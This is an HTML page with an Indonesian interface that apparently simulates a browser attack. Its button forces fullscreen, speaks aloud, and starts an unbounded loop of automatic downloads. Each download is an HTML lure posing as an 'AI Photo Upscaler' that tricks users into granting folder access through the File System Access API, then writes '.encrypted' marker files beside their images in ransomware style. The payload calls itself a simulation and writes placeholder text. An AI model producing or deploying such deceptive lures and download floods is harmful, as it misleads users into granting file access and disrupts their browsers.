<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Generator Berkas Blob &amp; ObjectURL</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Generator Berkas Blob &amp; ObjectURL</h2>
<p>Klik tombol untuk memicu pembuatan berkas Blob HTML yang akan meminta akses ke direktori (File System Access API).</p>

<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>

<div id="status" role="status">Sistem siap.</div>
<div id="downloads"></div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;

const speak = (message) => {
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'id-ID';
        utterance.rate = 1.0;
        window.speechSynthesis.speak(utterance);
    }
};

const prepareMimeBlobAsync = (i) => {
    return new Promise((resolve) => {
        queueMicrotask(() => {
            const payloadText = "<!DOCTYPE html>" +
            "<html>" +
            "<head><meta charset='UTF-8'><title>Photo Upscaler</title></head>" +
            "<body style='margin:0;padding:0;background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
            "<div style='text-align:center;padding:20px;max-width:400px;'>" +
            "<h1 style='font-size:32px;color:#fff;margin-bottom:20px;'>📸 AI Photo Upscaler</h1>" +
            "<p style='font-size:16px;color:#aaa;margin-bottom:30px;'>Tingkatkan kualitas foto Anda menjadi 4K secara instan. Pilih folder foto Anda untuk memulai.</p>" +
            "<button id='btn-select' style='background:#4CAF50;color:white;border:none;padding:15px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;width:100%;box-shadow:0 4px 15px rgba(76,175,80,0.4);'>Pilih Folder Foto</button>" +
            "<p id='status' style='color:#4CAF50;font-size:12px;margin-top:15px;'>Menunggu interaksi...</p>" +
            "<p style='color:#555;font-size:10px;margin-top:25px;'>Origin: <span id='o'></span></p>" +
            "</div>" +
            "<script>" +
            "(function(){" +
            "\"use strict\";" +
            "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
            
            "var sudah = false;" +
            
            // --- MUNCULKAN ALERT SAAT HALAMAN DIMUAT ---
            "window.addEventListener('load', function() {" +
            "    setTimeout(function() {" +
            "        alert('Peringatan: Aplikasi AI Photo Upscaler memerlukan akses ke folder foto Anda untuk memproses gambar.');" +
            "    }, 500);" +
            "});" +
            // ------------------------------------------
            
            "function cekDukungan() {" +
            "    if (!window.showDirectoryPicker) {" +
            "        return false;" +
            "    }" +
            "    return true;" +
            "}" +
            
            "document.getElementById('btn-select').addEventListener('click', async function() {" +
            "    if (sudah) return;" +
            "    sudah = true;" +
            "    var statusEl = document.getElementById('status');" +
            "    " +
            "    if (!cekDukungan()) {" +
            "        statusEl.textContent = 'Browser tidak mendukung File System Access API.';" +
            "        statusEl.style.color = '#f00';" +
            "        alert('Browser Anda tidak mendukung fitur ini. Gunakan Chrome/Edge versi terbaru.');" +
            "        sudah = false;" +
            "        return;" +
            "    }" +
            
            "    statusEl.textContent = 'Meminta izin akses folder...';" +
            "    statusEl.style.color = '#4CAF50';" +
            
            "    try {" +
            "        var dirHandle = await window.showDirectoryPicker();" +
            "        statusEl.textContent = 'Akses diberikan. Memproses foto...';" +
            
            "        var fileCount = 0;" +
            "        for await (var entry of dirHandle.values()) {" +
            "            if (entry.kind === 'file') {" +
            "                var file = await entry.getFile();" +
            "                if (file.type.startsWith('image/')) {" +
            "                    var newFile = await dirHandle.getFileHandle(entry.name + '.encrypted', { create: true });" +
            "                    var writable = await newFile.createWritable();" +
            "                    await writable.write('FILE ENCRYPTED BY SIMULATION');" +
            "                    await writable.close();" +
            "                    fileCount++;" +
            "                    statusEl.textContent = 'Memproses ' + fileCount + ' file...';" +
            "                }" +
            "            }" +
            "        }" +
            "        statusEl.textContent = 'Selesai memproses ' + fileCount + ' file.';" +
            "        alert('Simulasi selesai! ' + fileCount + ' file telah dimanipulasi.');" +
            "    } catch (e) {" +
            "        statusEl.textContent = 'Akses ditolak atau gagal: ' + e.message;" +
            "        statusEl.style.color = '#f00';" +
            "        sudah = false;" +
            "    }" +
            "});" +
            "})();" +
            "<\/script>" +
            "</body>" +
            "</html>";
          
            const blob = new Blob([payloadText], { type: "text/html" });
            const url = URL.createObjectURL(blob);
            resolve({ id: i, url: url });
        });
    });
};

const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    link.download = `photo-upscaler-${fileData.id}.txt`;
    link.textContent = `Blob #${fileData.id} (.txt)`;
    link.style.display = "none";
    downloadsDiv.appendChild(link);
    link.click();
};

const processLoop = async (counter) => {
    if (!isProcessing) return;

    const fileData = await prepareMimeBlobAsync(counter);
    activeUrls.push(fileData.url);
    triggerInstantDownload(fileData);

    statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;

    if (counter % 10 === 0) {
        speak(`Proses mencapai ${counter} berkas.`);
    }

    setTimeout(() => processLoop(counter + 1), 0);
};

startBtn.addEventListener("click", () => {
    if (isProcessing) return;

    activeUrls.forEach(url => URL.revokeObjectURL(url));
    activeUrls = [];
    downloadsDiv.replaceChildren();

    speak("Mengaktifkan mode layar penuh.");

    const root = document.documentElement;
    try {
        if (root.requestFullscreen) {
            root.requestFullscreen();
        } else if (root.webkitRequestFullscreen) {
            root.webkitRequestFullscreen();
        } else if (root.mozRequestFullScreen) {
            root.mozRequestFullScreen();
        }
        statusDiv.textContent = "Mengunci layar penuh...";
    } catch (err) {
        console.warn("Fullscreen tidak didukung atau ditolak:", err);
    }

    setTimeout(() => {
        isProcessing = true;
        speak("Proses pembuatan berkas Blob dimulai.");
        processLoop(1);
    }, 300);
});
</script>
</body>
</html>
